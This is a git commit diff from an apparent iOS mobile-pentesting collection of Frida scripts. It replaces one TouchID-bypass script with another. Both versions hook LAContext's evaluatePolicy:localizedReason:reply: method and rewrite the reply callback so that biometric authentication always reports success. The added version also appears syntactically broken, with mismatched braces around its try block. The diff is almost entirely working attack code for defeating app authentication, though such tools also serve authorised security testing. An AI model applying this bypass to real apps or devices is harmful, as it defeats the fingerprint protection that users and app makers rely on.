fa51e2cfb96ab8c80ac0f01dc8b31c5191821fe5
WaTF-Team <watfteam@gmail.com>
2018-06-10 13:08:23 +0700

    update Bypass-Fingerptiny.js

--- Frida-Scripts/iOS/Bypass-Fingerprint.js
+++ Frida-Scripts/iOS/Bypass-Fingerprint.js
@@ -1,48 +1,19 @@
-var resolver = new ApiResolver('objc');
-var LAContext_evaluatePolicy_localizedReason_reply = {};
-
-resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', {
-    onMatch: function (match) {
-        LAContext_evaluatePolicy_localizedReason_reply.name = match.name;
-        LAContext_evaluatePolicy_localizedReason_reply.address = match.address;
+if (ObjC.available)
+    try
+    {
+        Interceptor.attach(ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
+		onEnter: function(args) {
+		console.log("\n[*] Hooking LAContext");
+        var reply = new ObjC.Block(args[4]);
+        const replyCallback = reply.implementation;
+        reply.implementation = function (error, value)  {
+            return replyCallback(1, null);
+        };
+	console.log("[-] TouchID Bypass Completed ");
     },
-    onComplete: function () { }
 });
-
-if (LAContext_evaluatePolicy_localizedReason_reply.address) {
-
-    send({
-        status: 'success',
-        error_reason: NaN,
-        type: 'touchid-bypass',
-        data: 'Hooked ' + LAContext_evaluatePolicy_localizedReason_reply.name
-    });
-
-    Interceptor.attach(LAContext_evaluatePolicy_localizedReason_reply.address, {
-        onEnter: function (args) {
-            
-            var reason = new ObjC.Object(args[3]);
-
-            var original_block = new ObjC.Block(args[4]);
-
-            var saved_reply_block = original_block.implementation;
-
-            original_block.implementation = function (success, error) {
-
-                if (!success == true) {
-                    success = true;
-                }
-
-                saved_reply_block(success, error);
-
-                send({
-                    status: 'success',
-                    error_reason: NaN,
-                    type: 'touchid-bypass',
-                    data: 'TouchID bypass run complete'
-                });
-
-            };
-        }
-    });
-}
+    }
+    catch(err)
+    {
+        console.log("[!] Exception: " + err.message);
+    }
